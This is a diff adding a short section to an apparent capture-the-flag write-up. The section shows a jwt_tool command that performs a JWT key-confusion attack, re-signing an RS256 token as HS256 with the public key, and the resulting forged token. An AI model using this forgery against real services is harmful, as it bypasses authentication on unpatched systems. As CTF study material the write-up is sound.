@@ -358,3 +358,28 @@ Back to the Daily Rewards request, we notice its endpoint is /api/v2/gift. Chang
 apoorvctf{s1gm@_s1gm@_b0y}
 
 We got lucky there that the first technique we tried worked. But if it didn't, you have the notes you wrote, play around with them until you figure it out.
+
+## Web3 - Tanjero
+This is a easy JWT algorighm confusion attack which can be exploit by:
+
+```
+┌──(anhcd㉿MSI)-[/mnt/e/Web Pentest/JWT]
+└─$ python3 jwt_tool.py --exploit k -pk key.txt eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJhZG1pbiI6ZmFsc2UsIm5hbWUiOiJHdWVzdCIsImlhdCI6MTc0MDkwMDE1OH0.IqU5koM-VsyFHl-T2JSd-lwjx9rgfznmUdLyq-NenRruG0UnSQHgUOh9-W8fyXsv3SuMsbCoaM5tkSGA8M6Pea-tHFT7jrJJBTsmCM3AM0eGkZ2kWbQWZ2NvO4jL2iou538t5xCgYXFL57KBVt-7k_iVw3JaZUNoI6q5dTgq4PT9vOn6aUoh3rEpxGIcR5qcJRwXDwA9Fg_Qem3w5FH3-cKrtDxlMdDKD9fc4dXVnJgIc9AhjU12khbhdHnO1yXMW1NGM21c1o1Ws4NawdGK5k-xI8BoiCIWSZ5l50r7dZvEMwEVRAQ2nbXeXKy1kcz5agAE-y55xXDZeG5YIgFupQ
+
+        \   \        \         \          \                    \
+   \__   |   |  \     |\__    __| \__    __|                    |
+         |   |   \    |      |          |       \         \     |
+         |        \   |      |          |    __  \     __  \    |
+  \      |      _     |      |          |   |     |   |     |   |
+   |     |     / \    |      |          |   |     |   |     |   |
+\        |    /   \   |      |          |\        |\        |   |
+ \______/ \__/     \__|   \__|      \__| \______/  \______/ \__|
+ Version 2.2.7                \______|             @ticarpi
+
+Original JWT:
+
+File loaded: key.txt
+jwttool_808a8dcec18b1ed146cfdf74e4b0e430 - EXPLOIT: Key-Confusion attack (signing using the Public Key as the HMAC secret)
+(This will only be valid on unpatched implementations of JWT.)
+[+] eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJhZG1pbiI6ZmFsc2UsIm5hbWUiOiJHdWVzdCIsImlhdCI6MTc0MDkwMDE1OH0.ffRm10fLPVCBmFIbjFtMTgsicr-82TXtSW4slH8Md8E
+```
